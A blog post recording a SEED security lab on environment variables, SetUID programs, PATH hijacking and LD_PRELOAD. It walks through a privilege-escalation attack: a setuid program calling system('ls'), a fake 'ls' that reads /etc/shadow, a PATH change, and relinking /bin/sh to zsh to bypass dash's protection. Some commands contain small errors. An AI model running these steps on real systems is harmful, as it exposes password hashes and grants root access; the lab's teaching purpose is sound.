---
layout: post
title: Environment Variables & SetUID
excerpt: Environment variables are variables that store information, such as configuration settings or system paths, that can be accessed by applications and scripts. Environment variables affect the behavior of programs and scripts that use them. Environment variables are usually stored in a key-value pair format, where the variable name represents the key and its corresponding value represents the data associated with that variable.
categories: [setuid, setgid]
---

In this post, I aim to document my findings while performing a SEED lab.


### Environment Variables

Environment variables are variables that store information, such as configuration settings or system paths, that can be accessed by applications and scripts. Environment variables affect the behavior of programs and scripts that use them. Environment variables are usually stored in a key-value pair format, where the variable name represents the key and its corresponding value represents the data associated with that variable.

Environment variables can be set, modified, or removed by the user, by scripts, or by applications. To view the environmental variables that are already set, one can use `printenv` or `printenv [KEY]` i.e., `printenv SHELL`

To set an environment variable:

- `export KEY:"VALUE"`

To unset an environment variable:

- `unset KEY`

When a parent process creates a child process through `fork()`, the environment variables of the parent process is copied to the child process. This means that every child process will by default have the same environment variables that the parent has.

When `system()` is used to execute a command in a script or program, it doesn't directly execute the program, but rather calls `/bin/sh` to execute the command; however, when execve() is used to execute a command in a script or program, it directly executes a command. The implication of `system()` not directly executing the command is that any command provided cannot be effectively sanitized but gets sent through to `bin/sh` to execute.

<br>

### SetUID

Setuid, short for "set user ID upon execution," is a permission that allows a user to temporarily adopt the privileges of the owner of a file. This means that when a setuid is enabled for an executable file, anyone who executes that file does so as though he or she is the file's owner.

Setuid, if not implemented correctly, can pose security risks. Malicious users can exploit such programs to execute arbitrary code with elevated privileges.

From the previous section, we learned that some programs create new processes using `system()` and that these commands executed by `system()` are not executed directly but through a call to `/bin/sh`. This means that when setuid programs invoke a new process by calling `system()`, bad things can happen.

When a relative path is given, the program searches through the "PATHS" provided in the environment variable. By modifying the "PATH" in the environment variable and appending the path where our malicious program is to the beginning of the PATH variable, we can trick the program to run our malicious program with root permissions rather than the legitimate program.

<details>
  <Summary>
    Note:
  </Summary>
  <br>
   "/bin/sh" is a symbolic link pointing to "/bin/dash". Dash has a countermeasure that prevents itself from being executed in a Set-UID process. To see how our attack works without such a countermeasure, we will link "/bin/sh" to "/bin/sh" to "/bin/zsh" which does not have such a countermeasure. (ln -sf /bin/zsh /bin/sh)
</details>

When SetUID programs run, they create privileged processes during execution and destroy those privileged processes after execution. If some of the priviledged processes are not cleaned up, this could lead to capability leakage, whereby these privileged processes may still be accessible by the non-privileged processes. This is undesirable, as such leaked capabilities can be exploited by malicious users.


#### Create setuid program

1. The program that we would create and set the SetUID permission on is shown below:

   ```
    #include <stdlib.h>
    
    int main()
    {
      system("ls");
      return 0;
    }
    ```

2. Compile the program

   `gcc -o mysetuid mysetuid.c`

3. change the owner to root and set setuid permission

   - sudo chown root mysetuid

   -  sudo chmod 4755 mysetuid


#### Create malicious program

In order to take advantage of the vulnerability present in the setuid program, we will create a malicious program named ls and export the path of the malicious program to set the environment variable.

1. The malicious program that we would create is shown below:

   ```
    #include <stdlib.h>
    
    int main()
    {
      system("usr/bin/cat /etc/shadow");
      return 0;
    }
    ```

2. Compile the program

   `gcc -o malicious_app malicious_app`

3. backup the path, copy the malicious program to /tmp/bin/ and export the path

   - `printenv PATH > path_env.bk`
  
   - `mkdir /tmp/bin && cp ./malicious_app /tmp/bin/ls`
  
   - `export PATH=/tmp/bin:$PATH`


#### Run the setuid program

***PATH environment variable***
![path-env](https://github.com/iukadike/blog/assets/58455326/dcab81cf-1f32-407c-b22b-215f1ef16c05)

***`./mysetuid`***
![setuid](https://github.com/iukadike/blog/assets/58455326/4967ca5b-d476-4ed3-b115-fed4e2e24758)

<br>

### LD PRELOAD

An executable program usually relies on external libraries to function as expected. These external libraries can either be linked to the executable program statically or dynamically.

When these libraries are statically linked, the library code becomes part of the executable itself and is linked directly into the executable at compile time. This means that the program does not require any external libraries during execution. The size of the executable is usually larger. A disadvantage, though, is that if the libraries are updated, the executable needs to be recompiled with the updated library.

On the other hand, when these libraries are dynamically linked, a reference to the functions in the library is included in the executable at compile time and linked to the executable during runtime. The size of the executable is usually smaller. Since only a reference to the functions in the library is included in the executable, when a library is updated, the executable does not need to be recompiled as it will be linked to the updated library during runtime. A disadvantage, though, is that a malicious user can supply a malicious library that the executable will link to during execution.

The LD_PRELOAD environment variable allows a user to specify an additional shared library that should be loaded before all other libraries. The effect of this is that it allows overriding function calls that are made by other libraries.

<br>

Thanks for reading.


